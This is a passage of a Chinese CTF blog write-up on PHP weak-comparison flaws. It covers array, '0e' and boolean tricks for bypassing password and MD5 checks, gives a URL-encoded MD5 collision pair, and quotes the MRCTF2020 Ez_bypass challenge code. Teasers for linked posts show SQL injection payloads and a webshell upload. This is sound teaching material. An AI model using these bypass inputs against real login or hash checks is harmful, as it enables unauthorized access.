+<li><strong>规则</strong>：除了 <code>0</code>、空字符串 <code>&quot;&quot;</code>、空数组 <code>[]</code>、<code>null</code> 之外，<strong>几乎所有的东西转成布尔值都是 <code>true</code></strong>。</li>
+<li><strong>例子</strong>：<ul>
+<li><code>true == &quot;any_string&quot;</code> → <code>true</code></li>
+<li><code>true == 123</code> → <code>true</code></li>
+</ul>
+</li>
+<li><strong>应用场景</strong>：如果后端代码写的是 <code>if($password == true)</code>，你随便输入什么字符串都能直接登录。</li>
+</ul>
+<h4 id="3-数组（Array）的特殊处理"><a href="#3-数组（Array）的特殊处理" class="headerlink" title="3. 数组（Array）的特殊处理"></a>3. 数组（Array）的特殊处理</h4><p>正如我之前提到的，有些函数（比如 <code>md5()</code>）不接受数组。</p>
+<ul>
+<li><strong>情况</strong>：如果你给 <code>md5()</code> 传一个数组，比如 <code>md5([])</code>，PHP 会报一个警告，并返回 <strong><code>null</code></strong>。</li>
+<li><strong>逻辑绕过</strong>：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 如果代码是这样：</span><br><span class="line">if (md5($a) == md5($b))</span><br></pre></td></tr></table></figure>
+
+<p>你传入 <code>a[]=1&amp;b[]=2</code>。 计算结果变成：<code>NULL == NULL</code> → <strong>结果为 <code>true</code></strong>。 这种方法不仅能绕过科学计数法的 <code>0e</code>，甚至能绕过<strong>强类型比较 <code>===</code></strong>。</p>
+<h4 id="4-NULL、0、空字符串"><a href="#4-NULL、0、空字符串" class="headerlink" title="4. NULL、0、空字符串"></a>4. NULL、0、空字符串</h4><p>这三者在 <code>==</code> 下是“三位一体”的。</p>
+<ul>
+<li><code>0 == &quot;&quot;</code> → <code>true</code></li>
+<li><code>0 == &quot;0&quot;</code> → <code>true</code></li>
+<li><code>0 == null</code> → <code>true</code></li>
+<li><code>false == &quot;&quot;</code> → <code>true</code></li>
+</ul>
+<h4 id="5-科学计数法"><a href="#5-科学计数法" class="headerlink" title="5.科学计数法"></a>5.科学计数法</h4><p>当 PHP 执行 <code>if (&quot;0e123&quot; == &quot;0e456&quot;)</code> 时，它的大脑里发生了如下对话：</p>
+<ol>
+<li><strong>PHP</strong>：“左边是一个字符串 <code>0e123</code>，右边是一个字符串 <code>0e456</code>。”</li>
+<li><strong>PHP</strong>：“咦？等等，这两位长得好像科学计数法啊！左边 0×10 的 123 次方是 0，右边 0×10 的 456 次方也是 0。”</li>
+<li><strong>PHP</strong>：“既然它们在数学上都等于数字 0，那它们肯定就是相等的啦！”</li>
+<li><strong>结果</strong>：返回 <code>true</code>。</li>
+</ol>
+<p>3.强比较绕过</p>
+<p>根据有无string看，是否可以数组绕过</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73818134/article/details/131793815">https://blog.csdn.net/m0_73818134/article/details/131793815</a></p>
+<p>例子：</p>
+<p>a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</p>
+<p>b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>
+<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><h3 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 for you include &#x27;flag.php&#x27;;</span><br><span class="line">$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">	$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">	$gg=$_GET[&#x27;gg&#x27;];</span><br><span class="line">	if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">		echo &#x27;You got the first step&#x27;;</span><br><span class="line">		if(isset($_POST[&#x27;passwd&#x27;])) &#123;</span><br><span class="line">			$passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">			if (!is_numeric($passwd)) &#123;</span><br><span class="line">				if($passwd==1234567) &#123;</span><br><span class="line">					echo &#x27;Good Job!&#x27;;</span><br><span class="line">					highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">					die(&#x27;By Retr_0&#x27;);</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					echo &quot;can you think twice??&quot;;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				echo &#x27;You can not get it !&#x27;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			die(&#x27;only one way to get the flag&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	die(&#x27;Please input first&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">Please input first</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://2829750658t-svg.github.io">qyt</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://2829750658t-svg.github.io/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/Logic%20Flaw/">https://2829750658t-svg.github.io/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/Logic%20Flaw/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://2829750658t-svg.github.io" target="_blank">24kmagic</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">web-逻辑漏洞</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/images/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/images/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/images/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/images/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/sqlzhuru/" title="web-sql注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">web-sql注入</div></div><div class="info-2"><div class="info-item-1">web-sql注入08 第八章 天衍真言，星图显圣 题解1.判断字段数order by 2 2.判断回显位 ‘union select  1,2# Welcome 1 3.数据库名 ‘union select database()# Welcome user 4.尝试查询数据库名为user下的所有表名 ‘union select group_concat(table_name),2 from information_schema.tables where table_schema&#x3D;’user’# Welcome flag,users 5.尝试查询 数据库名为user，表名为flag 下的所有列名 ‘union select group_concat(column_name),2 from information_schema.columns where table_schema&#x3D;’user’ and table_name&#x3D;’flag’# Welcome value 6.查找数据 错误答案：’union select value,2 from flag...</div></div></div></a><a class="pagination-related" href="/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/fileuploadandcontain/" title="web-文件上传+包含"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">web-文件上传+包含</div></div><div class="info-2"><div class="info-item-1">web-文件上传+包含[第二章 web进阶]文件上传 1 文件上传漏洞 题解1.上传webshell.jpg文件 2.发现上传成功却无法打开 是因为上传的目录是随机的，所以用御剑扫描即可，找到对应网页 打开 [ACTF2020 新生赛]Upload 1十分波折的一道题目哈 1.文件上传php，失败，显示只能jpg等一堆正常格式 2.上传木马jpg，改成php，nonono 3.那改成phtml？黑名单绕过，可以 4.蚁剑连接得到flag 注意linux系统查看当前目录flag需要 cat &#x2F;flag 1234561. 直接上传.php文件 → 失败（前端/后端检测后缀，仅允许jpg/png等图片格式）；2. 上传图片马）→ 尝试抓包改回.php → 提示no（后端黑名单拦截.php）；3. 黑名单绕过：改后缀为.phtml（Apache默认解析.phtml为PHP）→ 上传成功；    细节：Content-Type为image/jpeg不改（绕MIME校验），仅改filename为xxx.phtml；4. 蚁剑连接：5. 拿flag：Linux系统下执行命令 cat ...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">qyt</div><div class="author-info-description">不要放弃自由去选择保障，到头来你两者都得不到</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/2829750658t-svg" target="_blank" title="GitHub"><i class="fab fa-github"></i></a><a class="social-icon" href="https://www.zhihu.com/people/7e5acf574f89c3cba9460c739673e2cf" target="_blank" title="知乎"><i class="fab fa-zhihu"></i></a><a class="social-icon" href="https://xhslink.com/m/2t0Ndc1uvYL" target="_blank" title="小红书"><i class="fas fa-notes-medical"></i></a><a class="social-icon" href="https://163cn.tv/Z9ohElT" target="_blank" title="网易云音乐"><i class="fas fa-music"></i></a><a class="social-icon" href="https://www.instagram.com/tenyeahqweyeah?igsh=NG92enl2NTE0NGMx&amp;utm_source=qr" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">很高兴能向你展示我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">web-逻辑漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0-revenge"><span class="toc-number">2.</span> <span class="toc-text">19 第十九章_revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.</span> <span class="toc-text">核心思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mini-l-ctf-web-Clickclick"><span class="toc-number">3.</span> <span class="toc-text">mini-l ctf web Clickclick</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GuessOneGuess"><span class="toc-number">4.</span> <span class="toc-text">GuessOneGuess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-number">5.</span> <span class="toc-text">[极客大挑战 2019]RCE ME</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">5.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9D%83%E9%99%90%E9%99%90%E5%88%B6-Permission-Denied-%E2%80%94%E2%80%94-%E6%9C%80%E5%8F%AF%E8%83%BD%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">5.2.</span> <span class="toc-text">1. 权限限制 (Permission Denied) —— 最可能的原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%87%BD%E6%95%B0%E8%A2%AB%E7%A6%81%E7%94%A8-Disable-Functions-%E2%80%94%E2%80%94-%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6"><span class="toc-number">5.3.</span> <span class="toc-text">2. 函数被禁用 (Disable Functions) —— 绕过限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AE%83%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%EF%BC%88SUID-%E6%9D%83%E9%99%90%EF%BC%89"><span class="toc-number">5.4.</span> <span class="toc-text">1. 它的原理是什么？（SUID 权限）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%B2%BE%E5%87%86%E6%89%BE%E5%88%B0%E5%AE%83%EF%BC%9F"><span class="toc-number">5.5.</span> <span class="toc-text">2. 如何在根目录下精准找到它？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BF%90%E8%A1%8C%E5%AE%83%E5%90%8E%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">5.6.</span> <span class="toc-text">4. 运行它后会发生什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87-Bitwise-NOT"><span class="toc-number">5.7.</span> <span class="toc-text">1. 取反绕过 (Bitwise NOT ~)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87-XOR"><span class="toc-number">5.8.</span> <span class="toc-text">2. 异或绕过 (XOR ^)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87-Increment"><span class="toc-number">5.9.</span> <span class="toc-text">3. 自增绕过 (Increment ++)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-number">6.</span> <span class="toc-text">[BJDCTF2020]Easy MD5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1"><span class="toc-number">6.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-md5%E5%BC%B1%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87"><span class="toc-number">6.2.</span> <span class="toc-text">1.md5弱比较绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%BC%B1%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87"><span class="toc-number">6.3.</span> <span class="toc-text">2.弱比较绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%AD%97%E6%AF%94%E8%BE%83"><span class="toc-number">6.3.1.</span> <span class="toc-text">1.字符串与数字比较</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B8%83%E5%B0%94%E5%80%BC%EF%BC%88True-False%EF%BC%89"><span class="toc-number">6.3.2.</span> <span class="toc-text">2.布尔值（True&#x2F;False）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%AD%97%E6%AF%94%E8%BE%83%EF%BC%88%E6%9C%80%E5%B8%B8%E8%A7%81%E7%9A%84%E5%9D%91%EF%BC%89"><span class="toc-number">6.4.</span> <span class="toc-text">1. 字符串与数字比较（最常见的坑）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2"><span class="toc-number">6.5.</span> <span class="toc-text">2. 十六进制字符串转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B8%83%E5%B0%94%E5%80%BC%EF%BC%88True-False%EF%BC%89%E7%9A%84%E2%80%9C%E4%B8%87%E8%83%BD%E5%8C%B9%E9%85%8D%E2%80%9D"><span class="toc-number">6.6.</span> <span class="toc-text">3. 布尔值（True&#x2F;False）的“万能匹配”</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%95%B0%E7%BB%84%EF%BC%88Array%EF%BC%89%E7%9A%84%E7%89%B9%E6%AE%8A%E5%A4%84%E7%90%86"><span class="toc-number">6.6.1.</span> <span class="toc-text">3. 数组（Array）的特殊处理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-NULL%E3%80%810%E3%80%81%E7%A9%BA%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">6.6.2.</span> <span class="toc-text">4. NULL、0、空字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95"><span class="toc-number">6.6.3.</span> <span class="toc-text">5.科学计数法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-Ez-bypass"><span class="toc-number">7.</span> <span class="toc-text">[MRCTF2020]Ez_bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2"><span class="toc-number">7.1.</span> <span class="toc-text">1</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/23/my-article/" title="my-article">my-article</a><time datetime="2026-01-23T03:41:18.000Z" title="发表于 2026-01-23 11:41:18">2026-01-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/ctf%E5%AD%A6%E4%B9%A0/web/ssrf/" title="ssrf">ssrf</a><time datetime="2026-01-21T11:56:05.000Z" title="发表于 2026-01-21 19:56:05">2026-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/ctf%E9%A2%98%E8%A7%A3/crypto/codetijie/" title="codetijie">codetijie</a><time datetime="2026-01-21T11:56:05.000Z" title="发表于 2026-01-21 19:56:05">2026-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/ctf%E5%AD%A6%E4%B9%A0/web/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="逻辑漏洞">逻辑漏洞</a><time datetime="2026-01-21T11:56:05.000Z" title="发表于 2026-01-21 19:56:05">2026-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/ctf%E5%AD%A6%E4%B9%A0/web/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">内网渗透</a><time datetime="2026-01-21T11:56:05.000Z" title="发表于 2026-01-21 19:56:05">2026-01-21</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By qyt</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': '2829750658t-svg/2829750658t-svg.github.io',
+      'data-repo-id': 'R_kgDOQS61dQ',
+      'data-category-id': 'DIC_kwDOQS61dc4C1UR-',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
